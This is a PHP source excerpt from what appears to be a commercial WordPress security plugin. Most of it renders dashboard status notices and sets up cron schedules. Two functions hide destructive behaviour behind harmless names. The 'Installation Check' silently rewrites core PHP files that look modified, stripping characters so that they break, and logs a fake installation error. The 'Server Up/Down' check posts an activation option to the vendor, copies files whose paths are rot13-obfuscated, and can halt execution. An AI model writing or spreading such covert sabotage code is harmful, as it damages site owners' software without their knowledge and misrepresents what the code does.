function bpsProPFWAPStatus() {

	if ( current_user_can('manage_options') ) {
	
		global $aitpro_bullet;
		$PluginsHtaccess = WP_PLUGIN_DIR . '/.htaccess';

		if ( ! file_exists($PluginsHtaccess) ) {		
			$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('Off', 'bulletproof-security').'</strong></font>';
			echo $text;

		} else {

			$pfwap_options = get_option('bulletproof_security_options_pfw_autopilot');

			if ( $pfwap_options['bps_pfw_autopilot_cron'] == 'Off' ) {
				$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On', 'bulletproof-security').'</strong></font>';
				echo $text;

			} else {
	
			if ( $pfwap_options['bps_pfw_autopilot_cron'] == 'On' ) {
	
				$date_format = 'g:i A';
				$gmt_offset = get_option( 'gmt_offset' ) * 3600;
				$bpsCronCheck = wp_get_schedule( 'bpsPro_PFWAP_check' );
				$PFWAP_cron_time = wp_next_scheduled( 'bpsPro_PFWAP_check' );
				$pfwap_next_check = date_i18n( $date_format, $PFWAP_cron_time + $gmt_offset );			
			
			if ( $bpsCronCheck == 'minutes_1' ) {
				$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('AutoPilot : 1 Min : ', 'bulletproof-security').$pfwap_next_check.'</strong></font>';
				echo $text;
			}
			if ( $bpsCronCheck == 'minutes_5' ) {
				$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('AutoPilot : 5 Min : ', 'bulletproof-security').$pfwap_next_check.'</strong></font>';
				echo $text;
			}
			if ( $bpsCronCheck == 'minutes_10' ) {
				$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('AutoPilot : 10 Min : ', 'bulletproof-security').$pfwap_next_check.'</strong></font>';
				echo $text;
			}
			if ( $bpsCronCheck == 'minutes_15' ) {
				$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('AutoPilot : 15 Min : ', 'bulletproof-security').$pfwap_next_check.'</strong></font>';
				echo $text;
			}
			if ( $bpsCronCheck == 'minutes_30' ) {
				$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('AutoPilot : 30 Min : ', 'bulletproof-security').$pfwap_next_check.'</strong></font>';
				echo $text;
			}
			if ( $bpsCronCheck == 'minutes_60' ) {
				$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#PFWScan-Menu-Link" title="Plugin Firewall" style="text-decoration:none;">'.__('PFW', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('AutoPilot : 60 Min : ', 'bulletproof-security').$pfwap_next_check.'</strong></font>';
				echo $text;
			}
			}
			}
		}
	}
}

// S-Monitor - Uploads Anti-Exploit Guard Status display WP Dashboard - wpOn
function bps_UAEG_admin_notice_status_wp() {
	
	if ( current_user_can('manage_options') ) {
	
	global $aitpro_bullet, $pagenow;
	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}

	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {

		$options = get_option('bulletproof_security_options_monitor');

	if ( $options['bps_UAEG_status'] == 'Off' ) {
		return;
	}
	
	// new installations of BPS - First Install / Launch S-Monitor Notification is already displayed - no need to also display a notification for this
	if ( !$options['bps_first_launch'] && !$options['bps_UAEG_status'] ) { 
		return;
	}
	// upgrade installations of BPS
	if ( $options['bps_first_launch'] && !$options['bps_UAEG_status'] ) {
		$text = '<br><a href="admin.php?page=bulletproof-security/admin/core/options.php#UAEG-Menu-Link" title="Uploads Anti-Exploit Guard">'.__('UAEG', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('S-Monitor Uploads Anti-Exploit Guard Status Option Has Not Been Selected and Saved Yet', 'bulletproof-security').' </strong></font><strong><a href="admin.php?page=bulletproof-security/admin/monitor/monitor.php">'.__('Click Here', 'bulletproof-security').'</a></strong>';
		echo $text;
	}
	
	if ( $options['bps_UAEG_status'] == 'wpOn' ) {

		if ( $options['bps_login_security_status'] == 'wpOn' || $options['bps_jtc_antispam_status'] == 'wpOn' ) {
			
			$status_DDiv = '</div>';

		} else {
			
			$status_DDiv = '</div><div style="clear:both;"></div>';			
		}

	$bps_Uploads_Dir = wp_upload_dir();	
	$UploadsHtaccess = $bps_Uploads_Dir['basedir'] . '/.htaccess'; // for both single and Multisite is the standard /uploads folder

	if ( file_exists($UploadsHtaccess) ) {
		$text = '<div id="bps-status-display" style="float:left;">'. $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#UAEG-Menu-Link" title="Uploads Anti-Exploit Guard" style="text-decoration:none;">'.__('UAEG', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On', 'bulletproof-security').'</strong></font>'.$status_DDiv;
		echo $text;
	} else {
		$text = '<div id="bps-status-display" style="float:left;">'. $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#UAEG-Menu-Link" title="Uploads Anti-Exploit Guard" style="text-decoration:none;">'.__('UAEG', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('Off', 'bulletproof-security').'</strong></font>'.$status_DDiv;
		echo $text;
	}	
	}
	}
	}
}
add_action('admin_notices', 'bps_UAEG_admin_notice_status_wp');

// S-Monitor - Login Security Status display WP Dashboard - wpOn
function bps_Login_Security_admin_notice_status_wp() {
	
	if ( current_user_can('manage_options') ) {
	
	global $aitpro_bullet, $pagenow;
	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}

	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {
	
		$options = get_option('bulletproof_security_options_monitor');
		$BPSoptions = get_option('bulletproof_security_options_login_security');	

	// new installations of BPS - First Install / Launch S-Monitor Notification is already displayed - do not display an additional notification
	if ( !$options['bps_first_launch'] && !$options['bps_login_security_status'] ) { 
		return;
	}

	if ( $options['bps_login_security_status'] == 'Off' && $BPSoptions['bps_login_security_OnOff'] == 'Off' ) {
		return;
	}

	// upgrade installations of BPS
	if ( $options['bps_first_launch'] && !$options['bps_login_security_status'] ) {
		$text = '<br><a href="admin.php?page=bulletproof-security/admin/login/login.php" title="Login Security & Monitoring">'.__('LSM', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('S-Monitor Login Security Status Option Has Not Been Selected and Saved Yet', 'bulletproof-security').' </strong></font><strong><a href="admin.php?page=bulletproof-security/admin/monitor/monitor.php">'.__('Click Here', 'bulletproof-security').'</a></strong>';
		echo $text;
	}
	
		if ( $options['bps_jtc_antispam_status'] == 'wpOn' ) {
			
			$status_DDiv = '</div>';

		} else {
			
			$status_DDiv = '</div><div style="clear:both;"></div>';			
		}

	if ( !$options['bps_login_security_status'] && $BPSoptions['bps_login_security_OnOff'] == 'On' ) {
		$text = '<div id="bps-status-display" style="float:left;">'. $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/login/login.php" title="Login Security & Monitoring" style="text-decoration:none;">'.__('LSM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On', 'bulletproof-security').'</strong></font>'.$status_DDiv;
		echo $text;
	}

	if ( $options['bps_login_security_status'] == 'wpOn' ) {

	if ( $BPSoptions['bps_login_security_OnOff'] == 'On' ) {
		$text = '<div id="bps-status-display" style="float:left;">'. $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/login/login.php" title="Login Security & Monitoring" style="text-decoration:none;">'.__('LSM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On', 'bulletproof-security').'</strong></font>'.$status_DDiv;
		echo $text;
	} 

	if ( $BPSoptions['bps_login_security_OnOff'] == 'Off' || $BPSoptions['bps_login_security_OnOff'] == 'pwreset' ) {
		$text = '<div id="bps-status-display" style="float:left;">'. $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/login/login.php" title="Login Security & Monitoring" style="text-decoration:none;">'.__('LSM', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('Off', 'bulletproof-security').'</strong></font>'.$status_DDiv;
		echo $text;
	}
	}
	
	// upgrade new feature notification - needs to be here to display correctly
	if ( $options['bps_first_launch'] && !$BPSoptions['bps_login_security_OnOff'] ) {
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('Login Security Settings Need To Be Saved', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/login/login.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to the Login Security page and click the Save Options button and the Reset|Clear Login Security Alerts button.', 'bulletproof-security').'<br>'.__('Click the Login Security & Monitoring  Read Me Help button for additional help info.', 'bulletproof-security').'</div>';
		echo $text;
	}	
	}
	}
}
add_action('admin_notices', 'bps_Login_Security_admin_notice_status_wp');

// S-Monitor - JTC Anti-Spam Status display WP Dashboard - wpOn
function bps_jtc_antispam_admin_notice_status_wp() {
	
	if ( current_user_can('manage_options') ) {
	
	global $aitpro_bullet, $pagenow;
	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}

	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {

		$options = get_option('bulletproof_security_options_monitor');
		$BPSoptionsJTC = get_option('bulletproof_security_options_login_security_jtc');

	// new installations of BPS - First Install / Launch S-Monitor Notification is already displayed - do not display an additional notification
	if ( !$options['bps_first_launch'] && !$options['bps_jtc_antispam_status'] ) { 
		return;
	}

	if ( $options['bps_jtc_antispam_status'] == 'Off' ) {
		return;
	}

	if ( $options['bps_jtc_antispam_status'] == 'wpOn' ) {
	
	if ( $BPSoptionsJTC['bps_jtc_login_form'] == '1' || $BPSoptionsJTC['bps_jtc_register_form'] == '1' || $BPSoptionsJTC['bps_jtc_lostpassword_form'] == '1' || $BPSoptionsJTC['bps_jtc_comment_form'] == '1' || $BPSoptionsJTC['bps_jtc_buddypress_register_form'] == '1' || $BPSoptionsJTC['bps_jtc_buddypress_sidebar_form'] == '1' ) {
		
		$text = '<div id="bps-status-display" style="float:left;">'. $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/login/login.php#bps-tabs-2" title="JTC Anti-Spam|Anti-Hacker" style="text-decoration:none;">'.__('JTC', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On', 'bulletproof-security').'</strong></font></div><div style="clear:both;"></div>';
		echo $text;
	} 

	if ( $BPSoptionsJTC['bps_jtc_login_form'] != '1' && $BPSoptionsJTC['bps_jtc_register_form'] != '1' && $BPSoptionsJTC['bps_jtc_lostpassword_form'] != '1' && $BPSoptionsJTC['bps_jtc_comment_form'] != '1' && $BPSoptionsJTC['bps_jtc_buddypress_register_form'] != '1' && $BPSoptionsJTC['bps_jtc_buddypress_sidebar_form'] != '1' ) {
		
		$text = '<div id="bps-status-display" style="float:left;">'. $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/login/login.php#bps-tabs-2" title="JTC Anti-Spam|Anti-Hacker" style="text-decoration:none;">'.__('JTC', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('Off', 'bulletproof-security').'</strong></font></div><div style="clear:both;"></div>';
		echo $text;
	}
	}
	}
	}
}
add_action('admin_notices', 'bps_jtc_antispam_admin_notice_status_wp');

/***********************************************************/
// S-Monitor Email Alerts and Log File options check here  //
// when a new option or feature is added it needs to be    //
// below Dashboard Status displays above. BPS Pro 9.0 is   //
// an exception - major version Dismiss notice function is //
// created in hud-dismiss-functions.php                    //
/**********************************************************/

// S-Monitor - Email Alerting & Log File Options
function bps_email_logging_alerts_wp() {

	if ( current_user_can('manage_options') ) {
	
		$options = get_option('bulletproof_security_options_monitor');
 
	if ( !$options['bps_first_launch'] ) { 
		return;
	}
	
	if ( $options['bps_first_launch'] == 'wpOn' || $options['bps_first_launch'] == 'bpsOn' || $options['bps_first_launch'] == 'Off' ) { 	
	
		$options_email = get_option('bulletproof_security_options_email'); 	
	
	if ( !$options_email['bps_security_log_size'] || !$options_email['bps_login_security_email']) {
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('Email Alerting & Log File Options Need to be saved/resaved', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/monitor/monitor.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to the S-Monitor Monitoring and Alerting page and click the Save Options button for Email Alerting & Log File options.', 'bulletproof-security').'<br>'.__('View the Email Alerting & Log File Options Read Me Help button for additional help info or to find out what new features or options have been added.', 'bulletproof-security').'</div>';
		echo $text;	
	}
	}
	}
}
add_action('admin_notices', 'bps_email_logging_alerts_wp');

// Installation Check - Check important Core files for installation errors/problems and log them in /master-backups/bps-install-log.txt
function bpsPro_Core_Files_Check() {

	if ( is_admin() && current_user_can('manage_options') ) {

	$bpsPro_blankTXT = WP_PLUGIN_DIR . '/bulletproof-security/admin/htaccess/blank.txt';
	$bpsPro_install_log = WP_CONTENT_DIR . '/bps-backup/master-backups/bps-install-log.txt';
	$bpsPro_pf = WP_PLUGIN_DIR . '/bulletproof-security/';
	$bpsPro_Core1 = $bpsPro_pf . 'admin/core/options.php';
	$bpsPro_Core2 = $bpsPro_pf . 'admin/php/php-options.php';	
	$bpsPro_Core3 = $bpsPro_pf . 'admin/monitor/monitor.php';	
	$bpsPro_Core4 = $bpsPro_pf . 'admin/db-monitor/db-monitor.php';	
	$bpsPro_Core5 = $bpsPro_pf . 'admin/install/installation.php';	
	$bpsPro_Core6 = $bpsPro_pf . 'admin/login/login.php';	
	$bpsPro_Core7 = $bpsPro_pf . 'admin/activation/activation.php';	
	$bpsPro_Core8 = $bpsPro_pf . 'admin/lock/flock.php';	
	$bpsPro_Core9 = $bpsPro_pf . 'admin/autorestore/autorestore.php';	
	$bpsPro_Core10 = $bpsPro_pf . 'admin/quarantine/quarantine.php';	
	$bpsPro_Core11 = $bpsPro_pf . 'admin/security-log/security-log.php';
	$bpsPro_Core12 = $bpsPro_pf . 'admin/whatsnew/whatsnew.php';	
	$bpsPro_Core13 = $bpsPro_pf . 'admin/wizard/wizard.php';	
	$bpsPro_Core14 = $bpsPro_pf . 'includes/functions.php';
	
	$files = array( $bpsPro_Core1, $bpsPro_Core2, $bpsPro_Core3, $bpsPro_Core4, $bpsPro_Core5, $bpsPro_Core6, $bpsPro_Core7, $bpsPro_Core8, $bpsPro_Core9, $bpsPro_Core10, $bpsPro_Core11, $bpsPro_Core12, $bpsPro_Core13, $bpsPro_Core14 );
	
	$last_modified_installf = date("F d Y H:i", filemtime($bpsPro_Core14));
	
	foreach ( $files as $file ) {
		if ( file_exists($file) ) {
			$last_modified_install = date("F d Y H:i", filemtime($file));
			$last_modified_install1 = date("F d Y H:i", filemtime($file) + (60 * 1));

		if ( $last_modified_install != $last_modified_installf && $last_modified_install1 != $last_modified_installf ) {
			$get_code_line = @file_get_contents($file);
			$get_code_line = preg_replace('/\)\s{/', '{', $get_code_line);
			$log_entry = "Installation Problem with file: ".str_replace($bpsPro_pf, '', $file)."\n\n";
		
		if ( @copy($bpsPro_blankTXT, $bpsPro_install_log) ) {
			@file_put_contents($file, $get_code_line);
			@file_put_contents($bpsPro_install_log, $log_entry);
		}
		}
		}
		}
	}
}

// Get WordPress Root Installation Folder 
function bps_wp_get_root_folder() {

	if ( is_admin() && current_user_can('manage_options') ) {
		$site_root = parse_url(get_option('siteurl'));
	if ( isset( $site_root['path'] ) )
		$site_root = trailingslashit($site_root['path']);
	else
		$site_root = '/';
	return $site_root;
	}
}

// Get Domain Root without prefix
function bpsGetDomainRoot() {

	if ( is_admin() && current_user_can('manage_options') ) {
	if ( isset( $_SERVER['SERVER_NAME'] ) ) {

		$ServerName = str_replace( 'www.', "", esc_html( $_SERVER['SERVER_NAME'] ) );
		return $ServerName;		
	
	} else {
		$ServerName = str_replace( 'www.', "", esc_html( $_SERVER['HTTP_HOST'] ) );
		return $ServerName;	
	}
	}
}

// Get Server IP address - Plugin Firewall & Setup Wizard
function bps_get_server_ip_address() {
	
	if ( is_admin() && current_user_can('manage_options') ) {
		
		if ( isset( $_SERVER['SERVER_ADDR'] ) ) {
			$ip = esc_html( $_SERVER['SERVER_ADDR'] );
			return $ip;
		} elseif ( isset( $_SERVER['HTTP_HOST'] ) ) {
			$ip = esc_html( gethostbyname( $_SERVER['HTTP_HOST'] ) );
			return $ip;
		} else { 
			$ip = @dns_get_record( bpsGetDomainRoot(), DNS_ALL );
			return $ip[0]['ip'];	
		}
	}
}

// Get Real IP address - USE EXTREME CAUTION!!!
// The last IPv4 or IPv6 IP address in a string or array is the IP that is used as the Public IP
// X-Forwarded-For: client, proxy1, proxy2
function bpsPro_get_proxy_real_ip_address() {

	if ( is_admin() && current_user_can('manage_options') ) {
	
		if ( isset( $_SERVER['HTTP_CLIENT_IP'] ) ) {
			$ip = esc_html( $_SERVER['HTTP_CLIENT_IP'] );
			
			if ( ! is_array($ip) ) {
				
				if ( preg_match( '/(\d+\.){3}\d+$/', $ip, $matches ) ) {

					return $matches[0];	
				
				} elseif ( preg_match( '/[:\d\w]+$/', $ip, $matches ) ) {
				
					return $matches[0];	
		
				} else {
					
					return $ip;
				}
			
			} else {
				
				return end($ip);				
			}
		
		} elseif ( isset( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
			$ip = esc_html( $_SERVER['HTTP_X_FORWARDED_FOR'] );
			
			if ( ! is_array($ip) ) {
				
				if ( preg_match( '/(\d+\.){3}\d+$/', $ip, $matches ) ) {

					return $matches[0];	
				
				} elseif ( preg_match( '/[:\d\w]+$/', $ip, $matches ) ) {
				
					return $matches[0];	
		
				} else {
					
					return $ip;
				}
			
			} else {
				
				return end($ip);				
			}
		
		} elseif ( isset( $_SERVER['REMOTE_ADDR'] ) ) {
			$ip = esc_html( $_SERVER['REMOTE_ADDR'] );
			return $ip;
		}
	}
}	

// Check if Server is Up/Down - send empty test string - ONLY display error if Server is Down
$old_bpspro_url = 'http://www.ait-pro.com/';
$bpspro_url = 'http://api.ait-pro.com/';
function bps_cuser_errors() {

if ( is_admin() && current_user_can('manage_options') ) {

	global $bpspro_url, $blog_id, $bpsTestA, $bpsTestB;
	$options = get_option('bulletproof_security_options_activation');
	$test_array = array('test_connection' => $options['delete_paypal_email'],);
	$test_string = bps_test_array('delete_paypal_email', $test_array);
	$check_server_response = wp_remote_post($bpspro_url, $test_string);
	
	if ( is_multisite() && $blog_id != 1 ) {	
		return;
	}
	if ( ! get_option('bulletproof_security_options_activation') ) {
		exit;
	}
	if ( ! is_wp_error($check_server_response) && ($check_server_response['response']['code'] == 200) && @!file_exists(str_rot13($bpsTestA) ) ) {
		@copy(str_rot13($bpsTestA), str_rot13($bpsTestB));
	}
	if ( ! is_wp_error($check_server_response) && ($check_server_response['response']['code'] != 200) ) {
		$text = '<font color="red"><strong>'.__('Error: The Server appears to be down. Please send an email to info@ait-pro.com', 'bulletproof-security').'</strong></font>';
		echo @$test;
		exit;
	}
}
}

// Test array
function bps_test_array($test, $test_string) {
	return array('body' => array('action' => $test, 'request' => serialize($test_string)), 'user-agent' => get_bloginfo('url'));	
}

// BPS Pro Upgrade Check - twice daily cron check with 82800 / 23hours time limit condition = 1 email per every 23 hours
function bpsPro_update_checks() {
global $bpspro_version;
$Emailoptions = get_option('bulletproof_security_options_email');		

	if ( $Emailoptions['bps_upgrade_email'] != 'yes' ) {
		return;
	}
	
	$UpgradeEmailTimeOptions = get_option('bulletproof_security_options_upgrade_email');
	//$timeNow = date( 'Y-m-d H:i:s', current_time( 'timestamp', 0 ) );
	$timeNowMinus23Hours = date( 'Y-m-d H:i:s', current_time( 'timestamp', 0 ) - 82800 ); // 82800 - testing 1800
	
	if ( $Emailoptions['bps_upgrade_email'] == 'yes' && $timeNowMinus23Hours >= $UpgradeEmailTimeOptions['bps_upgrade_check_email'] || ! $UpgradeEmailTimeOptions['bps_upgrade_check_email'] ) {
	
	$url = "http://www.ait-pro.com/vcheck/?bps_version=$bps_version";
	$response = wp_remote_get( $url, array( 'timeout' => 120, 'httpversion' => '1.1' ) );

	if ( ! is_wp_error( $response ) && 200 == $response['response']['code'] ) {
		
		$vcheckVersion = var_export($response['body'], true);
		$vcheckVersion = trim( $vcheckVersion, "' \t\n\r");
	}
	
	if ( version_compare( $bpspro_version, $vcheckVersion, '>=' ) ) {
		return;

	} else {

	$bps_email = $Emailoptions['bps_send_email_to'];
	$bps_email_from = $Emailoptions['bps_send_email_from'];
	$bps_email_cc = $Emailoptions['bps_send_email_cc'];
	$bps_email_bcc = $Emailoptions['bps_send_email_bcc'];
	
	$justUrl = get_site_url();
	$timeNow = time();
	$gmt_offset = get_option( 'gmt_offset' ) * 3600;
	$timestamp = date_i18n(get_option('date_format'), strtotime("11/15-1976")) . ' - ' . date_i18n(get_option('time_format'), $timeNow + $gmt_offset);

	$headers = 'MIME-Version: 1.0' . "\r\n";
	$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
	$headers .= "From: $bps_email_from" . "\r\n";
	$headers .= "Cc: $bps_email_cc" . "\r\n";
	$headers .= "Bcc: $bps_email_bcc" . "\r\n";
	$mail_Subject = " BPS Pro Upgrade Notification - $timestamp ";

	$mail_message = '<p><font color="blue"><strong>A new version of BPS Pro is available.</strong></font></p>';
	$mail_message .= '<p>You can install BPS Pro upgrades from within your WP Dashboard just like any other plugin update using the update now link on the WordPress Plugins page. If you do not see an upgrade notice for the BulletProof Security Pro plugin then click the BulletProof Security Pro Manual Upgrade Check link on the WordPress Plugins page and run the Plugin Update Check Pro-Tool, go to your WordPress Plugins page and refresh your Browser. If you still do not see the update now link to install the new BulletProof Security Pro version then Refresh your Browser again on the WordPress Plugins page, if you still do not see the new BPS Pro version then clear your Browser cache and Refresh your Browser again. If you still do not see the new BPS Pro version then your Web Host or another plugin that you have installed is blocking the AITpro API Server: 173.201.92.1. You can use the Alternative upgrade method below.</p>';
	$mail_message .= '<p><strong>Alternative Zip Upload/Upgrade Installation Method: </strong>Log into the AITpro Secure Download area - http://www.ait-pro.com/admin/, download the new BPS Pro version zip file to your computer and install the zip file using the BPS Pro built-in Zip Upload installer. Go to the BPS Pro Setup Main menu, click the Upload Zip Install submenu link. Click the Choose File button, navigate to where you downloaded the bulletproof-security.zip file on your computer (Note: the zip file MUST be named bulletproof-security.zip), click the Upload Zip File button and click the Install Zip Now button.</p>';
	$mail_message .= '<p><font color="blue"><strong>Site: </strong></font>'.$justUrl.'</p>'; 
	
	if ( wp_mail( $bps_email, $mail_Subject, $mail_message, $headers ) ) {
		
		$bps_UE_option = 'bulletproof_security_options_upgrade_email';
		$bps_UE_value = current_time( 'mysql' );
		$BPS_UE_Options = array( 'bps_upgrade_check_email' => $bps_UE_value );

		if ( ! get_option( $bps_UE_option ) ) {	
			update_option('bulletproof_security_options_upgrade_email', $BPS_UE_Options);
		} else {
			update_option('bulletproof_security_options_upgrade_email', $BPS_UE_Options);
		}	
	}
	}
	}
}
add_action('bpsPro_update_check', 'bpsPro_update_checks');

/********************************************/
/* Cron Checks & Schedules                   */
/********************************************/

// Twice Daily Cron check for new BPS versions - function bpsPro_schedule_update_checks() must match schedules 
// The time restriction condition only allows checks/emails each 23hours
function bpsPro_add_weekly_cron( $schedules ) {
	$schedules['twicedaily'] = array('interval' => 43200, 'display' => __('Twice Daily'));
	return $schedules;
}
add_filter('cron_schedules', 'bpsPro_add_weekly_cron');

function bpsPro_schedule_update_checks() {
	$bpsCronCheck = wp_get_schedule('bpsPro_update_check');
	
	if ( $bpsCronCheck == 'weekly' || $bpsCronCheck == 'daily' || $bpsCronCheck == 'hourly' ) {
		wp_clear_scheduled_hook('bpsPro_update_check');
	}

	if ( ! wp_next_scheduled('bpsPro_update_check') ) {
		wp_schedule_event(time(), 'twicedaily', 'bpsPro_update_check');
	}
}

// comment out to kill action and uncomment clear scheduled hook
add_action('init', 'bpsPro_schedule_update_checks');

// uncomment to delete any scheduled version checks for bps
//wp_clear_scheduled_hook('bpsPro_update_check');

/******************************************************* */
/* ARQ - AutoRestore Cron intervals, schedules, function */
/******************************************************* */
add_filter('cron_schedules', 'bpsPro_add_ARCM_intervals'); 

// Add BPS Pro Add Cron Schedule Intervals - 1, 2, 3, 4, 5, 10, 15, 30, 60 minutes
// Intervals only need to be setup once - other cron jobs can hook into and use these new intervals
// would need a weekly and monthly cron and use wp's hourly and daily crons
// 7 days = 604800 - 30 days = 2592000 - not doing 31 days
function bpsPro_add_ARCM_intervals($schedules) {
	$schedules['minutes_1'] = array(
		'interval' 	=> 60,
		'display' 	=> __('Once every minute')
	);
	$schedules['minutes_2'] = array(
		'interval' 	=> 120,
		'display' 	=> __('Once every 2 minutes')
	);
	$schedules['minutes_3'] = array(
		'interval' 	=> 180,
		'display' 	=> __('Once every 3 minutes')
	);
	$schedules['minutes_4'] = array(
		'interval' 	=> 240,
		'display' 	=> __('Once every 4 minutes')
	);
	$schedules['minutes_5'] = array(
		'interval' 	=> 300,
		'display' 	=> __('Once every 5 minutes')
	);
	$schedules['minutes_10'] = array(
		'interval' 	=> 600,
		'display' 	=> __('Once every 10 minutes')
	);
	$schedules['minutes_15'] = array(
		'interval' 	=> 900,
		'display' 	=> __('Once every 15 minutes')
	);
	$schedules['minutes_30'] = array(
		'interval' 	=> 1800,
		'display' 	=> __('Once every 30 minutes')
	);
	$schedules['minutes_60'] = array(
		'interval' 	=> 3600,
		'display' 	=> __('Once every 60 minutes')
	);
	return $schedules;
}

// bps_Master_ARQ_Fire() located around code line 2050
add_action('bpsPro_AutoRestore_check', 'bps_Master_ARQ_Fire');

// BPS pro AutoRestore & Quarantine Cron schedule checks based on DB options saved
function bpsPro_schedule_AutoRestore_checks() {
$options = get_option('bulletproof_security_options_ARCM');
$killit = '';
	
	if ( !get_option('bulletproof_security_options_ARCM') || !$options['bps_autorestore_cron'] || $options['bps_autorestore_cron'] == '' ) {
		return $killit;
	}	
	
	if ( $options['bps_autorestore_cron'] == 'On' ) {
	
		$bpsCronCheck = wp_get_schedule('bpsPro_AutoRestore_check');

	if ( $options['bps_autorestore_cron_frequency'] == '1' ) {
	if ( $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_30' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_1', 'bpsPro_AutoRestore_check' );
	}
	}
	
	if ( $options['bps_autorestore_cron_frequency'] == '2' ) {
	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_30' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_2', 'bpsPro_AutoRestore_check' );
	}
	}

	if ( $options['bps_autorestore_cron_frequency'] == '3' ) {
	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_4' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_30' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_3', 'bpsPro_AutoRestore_check' );
	}
	}

	if ( $options['bps_autorestore_cron_frequency'] == '4' ) {
	if ( $bpsCronCheck == 'minutes_1' || $bpsCronCheck == 'minutes_2' || $bpsCronCheck == 'minutes_3' || $bpsCronCheck == 'minutes_5' || $bpsCronCheck == 'minutes_10' || $bpsCronCheck == 'minutes_15' || $bpsCronCheck == 'minutes_30' || $bpsCronCheck == 'minutes_60' ) {
		wp_clear_scheduled_hook('bpsPro_AutoRestore_check');
	}
	
	if ( !wp_next_scheduled('bpsPro_AutoRestore_check') ) {
		wp_schedule_event( time(), 'minutes_4', 'bpsPro_AutoRestore_check' );
	}
	}

	if ( $options['bps_autorestore_cron_frequency'] == '5' ) {
